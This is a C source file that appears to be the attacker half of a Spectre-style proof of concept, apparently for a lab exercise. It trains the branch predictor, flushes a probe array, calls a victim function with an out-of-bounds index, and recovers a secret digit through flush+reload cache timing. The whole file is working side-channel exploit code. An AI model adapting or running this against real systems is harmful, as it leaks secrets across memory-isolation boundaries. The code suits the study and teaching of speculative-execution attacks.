#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <stdlib.h>
#include "cacheutils.h"
#include "common.h"

extern void run_victim(size_t idx);
extern void warm_up_victim(size_t idx);
extern void flush_sizes(void);
extern size_t secret_len;
extern uint8_t shared_array[];
extern uint8_t dummy;

#define REPEAT 3
#define TRAINING_LOOPS 10


int main(void) {

    for (size_t idx = 0; idx < 1; idx++) {
        uint64_t times[10][REPEAT] = {0};
        uint64_t dummy_times[REPEAT] = {0};

        for (int r = 0; r < REPEAT; r++) {
            
            // 2) Train branch predictor
            size_t safe_idx = 0;
            // Train CPU a random number of steps to prevent
            // stride prediction => Not sure that's actually necessary
            // Also randomizes the index
            //safe_idx = rand() % 16;
            //for (int t = 0; t < (rand() % TRAINING_LOOPS); t++) {
            for (int t = 0; t < (TRAINING_LOOPS); t++) {
                run_victim(safe_idx);
            }

            warm_up_victim(idx);


            // 1) Flush all digit slots
            for (int d = 0; d < 10; d++) {
                flush(&shared_array[PROBE_INDEX(d + '0')]);
            }
            flush(&dummy);
            flush_sizes();

            // 2) Victim accesses the secret digit at position pos
            size_t malicious_idx = idx + 16; // offset to read secret
            run_victim(malicious_idx);

            dummy_times[r] = reload(&dummy);

            // 3) Probe all 10 digits
            for (int d = 0; d < 10; d++) {
                void *addr = &shared_array[PROBE_INDEX(d + '0')];
                times[d][r] = reload(addr);
            }
        }

        // Print dummy times
        printf("Dummy reload times:\n");
        for (int r = 0; r < REPEAT; r++) {
            printf("%lu ", dummy_times[r]);
        }

        // Compute medians per digit
        uint64_t medians[10];
        for (int d = 0; d < 10; d++) {
            compute_median(times[d], REPEAT, &medians[d]);
        }

        // Pick digit with lowest median as the recovered secret digit
        int best_digit = -1;
        uint64_t best_med = (uint64_t)-1;
        for (int d = 0; d < 10; d++) {
            if (medians[d] < best_med) {
                best_med = medians[d];
                best_digit = d;
            }
        }

        // Debug print for this position
        printf("\n=== Index %zu ===\n", idx);
        for (int d = 0; d < 10; d++) {
            printf("digit %c: median=%lu%s\n",
                   '0' + d, medians[d], (d == best_digit ? " <-- best" : ""));
        }

        printf("Recovered secret[%zu] = '%c' (median=%lu)\n",
               idx, '0' + best_digit, best_med);
    }

    return 0;
}